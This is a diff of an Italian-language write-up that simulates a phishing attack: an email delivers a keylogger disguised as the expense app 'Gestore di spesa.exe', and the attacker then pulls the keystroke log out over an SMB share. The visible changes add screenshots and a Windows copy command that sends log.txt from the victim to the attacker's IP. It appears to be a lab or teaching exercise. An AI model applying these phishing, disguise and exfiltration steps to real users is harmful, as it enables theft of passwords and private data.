@@ -99,15 +99,13 @@ Il Team di Gestione delle Spese
 
 </blockquote>
 
-In allegato all'email, c'è un file eseguibile chiamato "Gestore_di_spesa.exe".
+In allegato all'email, c'è un file eseguibile chiamato "Gestore di spesa.exe".
 
 ### Tecniche Utilizzate
 
 + Personalizzazione: L'email è personalizzata per Alessandro, menzionando il suo interesse nella finanza e negli investimenti.
 + Finto Mittente: L'email appare provenire da una fonte affidabile nel settore finanziario.
 + Link Malevolo: L'email contiene un link a un file malevolo al cui interno c'è keylogger.
-
-
 
 ### Funzionamento del Software Malevolo
 
@@ -145,6 +143,10 @@ with Listener(on_press=on_press) as listener:
 
 Questo codice rappresenta un esempio di un keylogger scritto in Python, che registra tutti i tasti premuti e li salva in un file log.txt nella cartella dell'utente.
 
+Dopo la chiusura dell'applicazione, si può notare come nella gestione delle attività sia in esecuzione il Gestore di spesa:
+
+![Descrizione immagine](./images/Gestattsp.png)
+
 ### Raccolta dei Dati
 
 Dopo aver chiuso il programma, il keylogger inizia a catturare tutte le informazioni digitate da Alessandro, inclusi:
@@ -174,16 +176,18 @@ Questo comando crea una condivisione SMB denominata hax nella directory corrente
 
 Sulla macchina della vittima (il dispositivo di Alessandro), l'attaccante verifica la posizione del file log.txt generato dal keylogger. Il file è collocato nella directory C:\Windows\temp per costruzione del keylogger.
 
+![Descrizione immagine](./images/Temp.png)
+
 ### 3. Copia del File log.txt tramite SMB
 
 L'attaccante utilizza il comando copy di Windows per copiare il file log.txt dalla macchina della vittima alla condivisione SMB sul dispositivo dell'attaccante. Ecco il comando eseguito sulla macchina della vittima attraverso SSH:
 
-
-
-
 ```cmd
 copy C:\Windows\temp\log.txt \\10.0.2.15\hax\log.txt
 ```
+
+![Descrizione immagine](./images/Dopocopia.png)
+
 
 Dove 10.0.2.15 è l'indirizzo IP del dispositivo dell'attaccante.
 
